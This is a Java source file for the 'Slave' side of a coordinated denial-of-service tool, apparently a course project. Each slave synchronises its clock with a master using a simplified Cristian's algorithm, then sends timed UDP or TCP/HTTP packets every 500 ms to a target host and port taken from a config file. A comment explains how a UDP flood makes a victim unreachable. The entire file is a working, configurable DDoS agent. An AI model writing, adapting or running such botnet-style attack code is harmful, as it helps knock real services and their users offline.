/************************************************************
Class : Slave.java
This is the main class on the Slave side.
It serves two main functions:
	1. Synchronize time with the master, and
	2. Send DoS attacks to the target machine.
The time synchronization alogrithm is derived from Cristian's
paper and is simplified to ignore amortization.
DoS packets are sent every 500ms reading of the logical clock.
*************************************************************/

import java.net.*;
import java.io.*;
import java.util.*;
import java.lang.*;

public class Slave
{
	// input parameters to Slave (read from Slave.config file)
	public static int k;
	public static int synchPeriod;
	public static Long U;
	public static int WaitTime;

	// master connection info (read from Slave.config file)
	public static int backlog = Integer.MAX_VALUE;
	public static int masterSendPort;
	public static int slaveRcvPort;
	public static String masterHostName;
	public static ServerSocket slaveRcvSocket;

	//DoS Target information (read from Slave.config file)
	public static int DoSTargetPort;
	public static String DoSTargetHostName;
	public static int AttackLifetime;
	public static String AttackMode;

	//variables useful for Clock Synchronization
	public static String configFileName;
	public static LogicalClock logicalClock = new LogicalClock();
	public static int sn;
	public static int synchTries;
	public static Timer synchTimer = new Timer();
	public static Timer attemptTimer = new Timer();
	public static Timer sendDoSTimer = new Timer();
	public static Timer terminateSlave = new Timer();
	public static Long bfrT;
	public static Long aftrT;
	public static Long D;

	//variables used to collect synchronization stats
	private static int totalClockSynchRequests = 0;
	private static int totalClockRetriesRequests = 0;
	private static int totalRepliesReceivedOnTime = 0;
	private static int totalSNMistmatchReplies = 0;
	private static int totalLargeDReplies = 0;
	private static int totalSuccessReplies = 0;

	/***********************************************************************************************
	// Class SendDoSTimerTask: Is responsible for sending DoS attack packets to targeted machine.
	// It checks the attack mode and based on that sends the appropriate packet.
	***********************************************************************************************/
	class SendDoSTimerTask extends TimerTask
	{
		public void run()
		{
			Long DoSTime = logicalClock.getCurrentTime();
			String attackString = "This is the attack String YADADAYADADA kfkkdk @idkdkkd";
			if (AttackMode.equals("UDP"))
			{
				/** 
				A UDP flood attack can be initiated by sending a large number of 
				UDP packets to random ports on a remote host. As a result, the distant host will:
				1. Check for the application listening at that port; 
				2. See that no application listens at that port; 
				3. Reply with an ICMP Destination Unreachable packet. 
				Thus, for a large number of UDP packets, the victimized system will be forced 
				into sending many ICMP packets, eventually leading it to be unreachable by other clients.
				**/
				try
				{
					DatagramSocket attackedSocket = new DatagramSocket();
					byte[] buffer = attackString.getBytes();
					try
					{
						DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(DoSTargetHostName), DoSTargetPort);
						try
						{
							attackedSocket.send(packet);
							logicalClock.totalDoSPacketsSent++;
						}
						catch (PortUnreachableException puEx) { puEx.printStackTrace(); }
						catch (IOException ioEx) { ioEx.printStackTrace(); }
						finally
						{
							attackedSocket.close();
						}
					}
					catch (UnknownHostException uhEx) { uhEx.printStackTrace(); }
				}
				catch (SocketException socketException) { System.out.println("Error: Could not connect to attacked machine"); }
			}
			else if (AttackMode.equals("TCP"))
			{
				try
				{
					Socket attackedSocket = new Socket(DoSTargetHostName, DoSTargetPort);
					PrintWriter out = new PrintWriter(attackedSocket.getOutputStream(), true);
					//out.println("GET /" + attackString + "HTTP/1.1");
					out.println("GET /index.htm HTTP/1.1");
					out.println("Host: " + DoSTargetHostName + ":80");
					out.println("Connection: Close");
					out.println();
					logicalClock.totalDoSPacketsSent++;
					attackedSocket.close();
				}
				catch (UnknownHostException uhEx) { uhEx.printStackTrace(); }
				catch (IOException ioEx) { ioEx.printStackTrace(); }
			}
			else
			{
				System.out.println("Unknown Attack Mode");
			}
			System.out.println("DOS THREAD: SEND DoS PACKET At :" + DoSTime + " " + logicalClock.totalDoSPacketsSent);
		}
	}

	// This method listens for a response from the master socket.
	// Upon receiving a reply, its parses the message and validates whether
	// time synchronization succeeded or not. Upon success , it updates the
	// adjustment ariable and the lgocial clock.
	public synchronized void WaitForReply() throws IOException
	{
		//wait for a reply from master
		String result = "";
		Socket rcvSocket = slaveRcvSocket.accept();
		BufferedReader in = new BufferedReader(new InputStreamReader(rcvSocket.getInputStream()));
		result = in.readLine();
		totalRepliesReceivedOnTime++;
		System.out.println("Received reply: " + result);

		//received a message from master
		//parse the message
		String[] parseIncomingMsg = result.split(";");
		Long MasterTime = Long.parseLong(parseIncomingMsg[1]);
		int snPrime = Integer.parseInt(parseIncomingMsg[2]);

		//check seq. nos.
		if (sn != snPrime)
		{
			totalSNMistmatchReplies++;
			System.out.println("Synch Failure: sn and snPrime are not equal");
		}
		else
		{
			aftrT = (new Date()).getTime();
			D = ((aftrT - bfrT) / (long)2);

			//check D
			if (D > U)
			{
				totalLargeDReplies++;
				System.out.println("Synch Failure: " + D.toString() + " D was greater than U");
			}
			else
			{
				// cancel re-try attempts and update adjustment variable
				attemptTimer.cancel();
				attemptTimer = new Timer();
				System.out.println("Synch Success: SAftr=" + aftrT.toString() + ", SBfr=" + bfrT.toString() + ", D=" + D.toString() + ", M=" + MasterTime.toString());
				totalSuccessReplies++;
				logicalClock.setN((MasterTime + D) - aftrT);

				//set when to send next DoS attack
				sendDoSTimer.cancel();
				sendDoSTimer = new Timer();
				try
				{
					sendDoSTimer.schedule(new SendDoSTimerTask(), 500 - (logicalClock.getCurrentTime() % 500), 500);
					System.out.println("Scheduled a DoS to fire after " + (500 - (logicalClock.getCurrentTime() % 500)) + "ms");
				}
				catch (IllegalStateException dosEx) { /* Slave has been instructed to terminate */}

				try
				{
					synchTimer.schedule(new SynchTimerTask(), synchPeriod);
				}
				catch (IllegalStateException e){/* Slave has been instructed to terminate*/}
			}
		}
	}

	/***********************************************************************************************
	// Class AttemptimerTask: Is responsible for sending synchronization retry attempts to the master.
	// It attempts to send upto k requests if the replies do not return in time. After sending a new
	// attempt request it listens for a reply.
	***********************************************************************************************/
	class AttemptTimerTask extends TimerTask
	{
		public void run()
		{
			if (synchTries >= k)
			{
				System.out.println("Maximum number of successive reading attempts failed");
				System.out.println("Leaving group and re-joining...");
				synchTimer.cancel();
				attemptTimer.cancel();
				synchTimer = new Timer();
				attemptTimer = new Timer();
				try
				{
					synchTimer.schedule(new SynchTimerTask(), 0);
				}
				catch (IllegalStateException e)
				{
					/* Slave has been instructed to terminate*/
				}
			}
			else
			{
		                try
                		{
		                        Socket slaveSendSocket = new Socket(masterHostName, masterSendPort);
                		        PrintWriter slaveSendSocketOut = new PrintWriter(slaveSendSocket.getOutputStream(), true);

	                                synchTries++;
        	                        sn++;
                	                bfrT = (new Date()).getTime();
        
	                                //send message to master
        	                        String question = "time=?;" + sn;
                	                System.out.println("Attempt: Sending query: " + question);
                        	        slaveSendSocketOut.println(question);
                                	totalClockRetriesRequests++;
                               
					slaveSendSocketOut.close();
                                	slaveSendSocket.close();
		                }
        		        catch (UnknownHostException e)
                		{
                        		System.out.println("Don't know about host: " + masterHostName);
					System.exit(-1);
                		}
               			catch (IOException e)
                		{        
                        		System.out.println("Couldn't get I/O for the connection to: " + masterHostName + "port: " + masterSendPort);
					System.exit(-1);
                		}

				try
				{
					attemptTimer.schedule(new AttemptTimerTask(), WaitTime);
				}
				catch (IllegalStateException e)
				{
					/* Slave has been instructed to terminate*/
				}
				try
				{
					WaitForReply();
				}
				catch (IOException e){}
			}
		}
	}

	/***********************************************************************************************
	// Class SynchTimerTask: Is responsible for sending periodic synchronization requests to the master.
	// It send a request and listens for a reply.If the replies do not return in time, a re-try attempt
	// timer is executed.
	***********************************************************************************************/
	class SynchTimerTask extends TimerTask
	{
		public void run()
		{
                	try
                        {
                        	Socket slaveSendSocket = new Socket(masterHostName, masterSendPort);
                               	PrintWriter slaveSendSocketOut = new PrintWriter(slaveSendSocket.getOutputStream(), true);
                                        
				synchTries = 1;
				sn++;
				bfrT = (new Date()).getTime();

				//send message to master
				String question = "time=?;" + sn;
				System.out.println("Synch: Sending query: " + question);
				slaveSendSocketOut.println(question);
				totalClockSynchRequests++;
			
				slaveSendSocketOut.close();
				slaveSendSocket.close();
                      	}
                        catch (UnknownHostException e)
                        {  
                                System.out.println("Don't know about host: " + masterHostName);
				System.exit(-1);
                        }
                        catch (IOException e)
                        {
       	                	System.out.println("Couldn't get I/O for the connection to: " + masterHostName + "port: " + masterSendPort);
                       		System.exit(-1);
			}

			try
			{
				attemptTimer.schedule(new AttemptTimerTask(), WaitTime);
			}
			catch (IllegalStateException e){/* Slave has been instructed to terminate*/}
			try
			{
				WaitForReply();
			}
			catch (IOException e){}
		}
	}

	/***********************************************************************************************
	// Class TerminateSlaveTimerTask: Is responsible for terminating the slave and printing out
	// synchronization related statistics.
	***********************************************************************************************/
	static class TerminateSlaveTimerTask extends TimerTask
	{
		public void run()
		{
			// attack liftime expired
			synchTimer.cancel();
			sendDoSTimer.cancel();
			attemptTimer.cancel();
			System.out.println("DoS Attack lifetime has expired. Shutting down slave...");
			printSynchStats();
			try
			{
				slaveRcvSocket.close();
			}
			catch (IOException e) { }
			System.exit(0);
		}
	}

	// Initialize the slave object by reading the config file
	public void Initialize(BufferedReader in) throws IOException
	{
		//read and initialize values from Slave.config file
		String inputLine;
		inputLine = in.readLine();
		while (null != inputLine)
		{
			String[] parseInputLine = inputLine.split("=");
			if (parseInputLine[0].equals("MasterIP"))
			{
				masterHostName = parseInputLine[1];
				System.out.println("Master Name = " + masterHostName);
			}
			else if (parseInputLine[0].equals("MasterSendPort"))
			{
				masterSendPort = Integer.parseInt(parseInputLine[1]);
				System.out.println("Master Send Port = " + masterSendPort);
			}
			else if (parseInputLine[0].equals("SlaveRcvPort"))
			{
				slaveRcvPort = Integer.parseInt(parseInputLine[1]);
				System.out.println("Slave Rcv Port = " + slaveRcvPort);
			}
			else if (parseInputLine[0].equals("U"))
			{
				U = new Long(parseInputLine[1]);
				System.out.println("U = " + U.toString() + " milliseconds");
			}
			else if (parseInputLine[0].equals("k"))
			{
				k = Integer.parseInt(parseInputLine[1]);
				System.out.println("k = " + k);
			}
			else if (parseInputLine[0].equals("W"))
			{
				WaitTime = Integer.parseInt(parseInputLine[1]);
				System.out.println("W = " + WaitTime + " milliseconds");
			}
                        else if (parseInputLine[0].equals("SynchFrequency"))
                        {
                                synchPeriod = Integer.parseInt(parseInputLine[1]);
                                System.out.println("Synch Frequency = " + synchPeriod + " milliseconds");
                        }
			else if (parseInputLine[0].equals("DoSTargetIP"))
			{
				DoSTargetHostName = parseInputLine[1];
				System.out.println("DoS Target Host Name = " + DoSTargetHostName);
			}
			else if (parseInputLine[0].equals("DoSTargetPort"))
			{
				DoSTargetPort = Integer.parseInt(parseInputLine[1]);
				System.out.println("DoS Target Port = " + DoSTargetPort);
			}
			else if (parseInputLine[0].equals("AttackLifetime"))
			{
				AttackLifetime = Integer.parseInt(parseInputLine[1]);
				System.out.println("AttackLifetime = " + AttackLifetime + " minute(s)");
			}
			else if (parseInputLine[0].equals("AttackMode"))
			{
				AttackMode = parseInputLine[1];
				System.out.println("Attack Mode = " + AttackMode);
			}
			else
			{
				System.out.println("Error parsing config file");
				System.exit(-1);
			}
			//read next line
			inputLine = in.readLine();
		}

		// establish a connection with master
		try
		{
			slaveRcvSocket = new ServerSocket(slaveRcvPort, backlog);
		}
		catch (IOException e)
		{
			System.out.println("Couldn't get I/O for the connection to port: " + slaveRcvPort);
			System.exit(-1);
		}

		sn = 0;
		try
		{
			synchTimer.schedule(new SynchTimerTask(), 0);
		}
		catch (IllegalStateException e){/* Slave has been instructed to terminate*/}
	}

	// Print all synchronization and DoS related statistics
	private static void printSynchStats()
	{
		System.out.println("SYNCHRONIZATION STATISTICS");
		System.out.println("--------------------------------------------------------------");
		System.out.println("--------------------------------------------------------------");
		System.out.println(" Time Synch Messages SENT to Master:");
		System.out.println("\t Successive Synch Requests sent : " + totalClockSynchRequests);
		System.out.println("\t Retry Synch Requests sent      : " + totalClockRetriesRequests);
		System.out.println("\t TOTAL SYNCH Requests sent      : " + (totalClockSynchRequests + totalClockRetriesRequests));
		System.out.println("--------------------------------------------------------------");
		System.out.println(" Time Synch Messages RECEIVED from Master:");
		System.out.println("\t Synch Replies Received On-time : " + totalRepliesReceivedOnTime);
		System.out.println("\t [These are replies received [on-time] before a new synch request was scheduled]");
		System.out.println("\t\t Successful Synch Replies received         : " + totalSuccessReplies);
		System.out.println("\t\t Synch Replies received with D > U         : " + totalLargeDReplies);
		System.out.println("\t\t Synch Replies received with seq# mismatch : " + totalSNMistmatchReplies);
		System.out.println("\t Synch Replies lost/discarded   : " + (totalClockSynchRequests + totalClockRetriesRequests - totalRepliesReceivedOnTime));
		System.out.println("\t [These are replies lost due to communication failure or ignored]");
		System.out.println("---------------------------------------------------------------");
		System.out.println(" Synchronization Success Rate ~= " + ((totalSuccessReplies * 100) / (totalClockSynchRequests + totalClockRetriesRequests)) + "%");
		System.out.println(" Clock was synchronized " + totalSuccessReplies + " times in " + AttackLifetime + "minute(s)");
		if (totalSuccessReplies > 0)
			System.out.println("\t Average gap between clock synchs ~= " + ((AttackLifetime * 60 * 1000) / totalSuccessReplies) + "milliseconds");
		System.out.println("--------------------------------------------------------------");
		System.out.println("--------------------------------------------------------------");
		System.out.println("Total DoS Packets Sent : " + logicalClock.totalDoSPacketsSent);
	}

	public static void main(String[] args) throws IOException
	{
		Slave slave = new Slave();
		if (args.length > 0 && null != args[0])
			configFileName = args[0];
		else
			configFileName = "Slave.config";

		//parse the config file and initialize the slave
		try
		{
			slave.Initialize(new BufferedReader(new FileReader(configFileName)));
		}
		catch (FileNotFoundException e)
		{
			System.out.println(e.toString());
			System.exit(-1);
		}
		terminateSlave.schedule(new TerminateSlaveTimerTask(), AttackLifetime * 60 * 1000);
	}
}
